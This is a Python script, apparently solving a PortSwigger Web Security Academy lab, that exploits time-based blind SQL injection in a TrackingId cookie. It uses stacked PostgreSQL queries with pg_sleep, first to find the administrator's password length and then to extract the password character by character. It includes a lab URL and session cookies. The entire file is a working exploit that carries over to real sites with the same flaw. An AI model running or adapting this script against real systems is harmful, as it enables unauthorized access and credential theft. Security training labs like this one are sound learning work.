import requests
import string
from urllib.parse import quote_plus, quote

charset = string.ascii_lowercase + string.digits
# charset = "tdepmpqvc9hdrbscined"

burp0_url = "https://0a3100ee037d7e3880ae30be00e400d2.web-security-academy.net/filter?category=Lifestyle"
burp0_cookies = {
    "TrackingId": "02Pa25f5Z0JFybY8",
    "session": "saZ3q52ueTNFHedDU4MsNaOoVLj6urpU",
}

# Sample payload: '; SELECT 1 FROM pg_sleep(10)--
def blind_sql(payload):
    global burp0_url
    global burp0_cookies
    modified_cookies = burp0_cookies.copy()
    modified_cookies["TrackingId"] += payload
    res = requests.get(burp0_url, cookies=modified_cookies)
    return res.elapsed.total_seconds() > 10

def parse_payload(payload):
    payload_quoted_plus = quote_plus(f";{payload}")
    return f"'{payload_quoted_plus}--"

# print(parse_payload("select 1 from pg_sleep(5)"))

def get_password_length():
    for i in range(1, 100):
        payload = f"SELECT CASE WHEN LENGTH(password)={i} THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator'--"
        print(f"Trying: {i}")
        if blind_sql(parse_payload(payload)):
            return i


def get_password():
    # password_length = get_password_length()
    password_length = 20
    print(f"Password length: {password_length}")
    password = ""
    for i in range(password_length):
        for char in charset:
            payload = f"SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, {i+1}, 1)='{char}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--"
            if blind_sql(parse_payload(payload)):
                password += char
                print(f"Found: {password}")
                break

    return password

print(get_password())